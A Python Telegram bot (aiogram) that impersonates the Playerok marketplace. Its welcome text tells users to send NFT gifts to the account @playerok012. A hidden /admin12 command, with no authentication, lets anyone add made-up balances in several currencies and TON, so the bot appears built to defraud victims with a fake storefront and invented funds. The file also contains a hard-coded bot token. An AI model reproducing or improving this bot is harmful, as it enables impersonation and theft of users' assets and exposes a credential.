import logging
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

TOKEN = "9187770017:AAG3X7oTfwoyiMhWmZv_cuNHZY-zISmBzMA"
WEB_APP_URL = "https://your-domain.com" # Укажите ссылку на выложенный index.html

bot = Bot(token=TOKEN)
dp = Dispatcher()

users_balance = {}

class AdminStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_amount = State()

def get_user_balance(user_id: int):
    if user_id not in users_balance:
        users_balance[user_id] = {
            "rub": 0.0, "usd": 0.0, "uah": 0.0,
            "byn": 0.0, "stars": 0, "ton": 0.0
        }
    return users_balance[user_id]

@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Пользователь"
    bal = get_user_balance(user_id)
    
    welcome_text = (
        f"👋 **Добро пожаловать, {user_name}!**\n\n"
        f"🎮 **Playerok** — маркетплейс безопасных сделок.\n\n"
        f"💰 **Ваш баланс:**\n"
        f"• Рубли (₽): `{bal['rub']:.2f}`\n"
        f"• Доллары ($): `{bal['usd']:.2f}`\n"
        f"• Гривны (₴): `{bal['uah']:.2f}`\n"
        f"• Белорусские рубли (BYN): `{bal['byn']:.2f}`\n"
        f"• Звёзды (⭐): `{bal['stars']}`\n"
        f"• TON: `{bal['ton']:.2f}`\n\n"
        f"📜 **Правила сервиса:**\n"
        f"1. Все сделки проводятся строго через гаранта.\n"
        f"2. Запрещено передавать деньги вне сайта.\n"
        f"3. ⚠️ **Важно:** При оплате NFT-подарка передайте его на аккаунт **@playerok012**.\n\n"
        f"🛡 **Преимущества:** Гарант 24/7, мгновенный вывод и удобство.\n\n"
        f"👇 Нажмите кнопку ниже, чтобы открыть приложение."
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🚀 Открыть приложение Playerok", web_app=WebAppInfo(url=WEB_APP_URL))],
            [InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/playerok012")]
        ]
    )
    
    photo_url = "https://images.unsplash.com/photo-1550745165-9bc0b252726f"
    
    await message.answer_photo(
        photo=photo_url,
        caption=welcome_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(Command("admin12"))
async def admin_panel(message: types.Message):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Пополнить баланс СЕБЕ", callback_data="add_self")],
            [InlineKeyboardButton(text="👤 Выдать по ID другому", callback_data="add_other")]
        ]
    )
    
    await message.answer(
        "👑 **Админ-панель Playerok**\n\nВыберите действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "add_self")
async def choose_currency_self(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(target_id=callback.from_user.id)
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Рубли (₽)", callback_data="curr_rub"), InlineKeyboardButton(text="Доллары ($)", callback_data="curr_usd")],
            [InlineKeyboardButton(text="Гривны (₴)", callback_data="curr_uah"), InlineKeyboardButton(text="Бел. рубли (BYN)", callback_data="curr_byn")],
            [InlineKeyboardButton(text="Звёзды (⭐)", callback_data="curr_stars"), InlineKeyboardButton(text="TON", callback_data="curr_ton")]
        ]
    )
    await callback.message.edit_text("Выберите валюту для пополнения:", reply_markup=keyboard)
    await state.set_state(AdminStates.waiting_for_currency)

@dp.callback_query(AdminStates.waiting_for_currency, F.data.startswith("curr_"))
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.edit_text(f"Введите сумму пополнения для **{currency.upper()}** (просто отправьте число сообщением):", parse_mode="Markdown")
    await state.set_state(AdminStates.waiting_for_amount)

@dp.message(AdminStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
    except ValueError:
        await message.answer("❌ Ошибка! Введите корректное число.")
        return
        
    data = await state.get_data()
    target_id = data['target_id']
    currency = data['currency']
    
    bal = get_user_balance(target_id)
    bal[currency] += amount
    
    await message.answer(
        f"✅ **Баланс успешно пополнен!**\n\n"
        f"Сумма: `+{amount}` `{currency.upper()}`\n"
        f"Текущий баланс: `{bal[currency]}`",
        parse_mode="Markdown"
    )
    await state.clear()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("Бот Playerok запущен!")
    asyncio.run(dp.start_polling(bot))
